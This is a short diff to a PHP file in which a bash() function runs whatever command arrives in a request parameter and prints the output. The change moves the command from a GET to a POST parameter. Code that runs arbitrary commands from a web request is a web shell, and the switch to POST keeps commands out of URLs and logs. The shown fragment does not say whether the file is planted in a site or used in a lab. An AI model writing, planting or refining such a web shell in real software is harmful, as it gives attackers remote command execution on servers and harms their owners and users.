@@ -26,7 +26,7 @@ function bash($cmd) {
 }
 
 echo '<pre>';
-bash($_GET['cmd']);
+bash($_POST['cmd']);
 echo '</pre>';
 ?>
 </div>
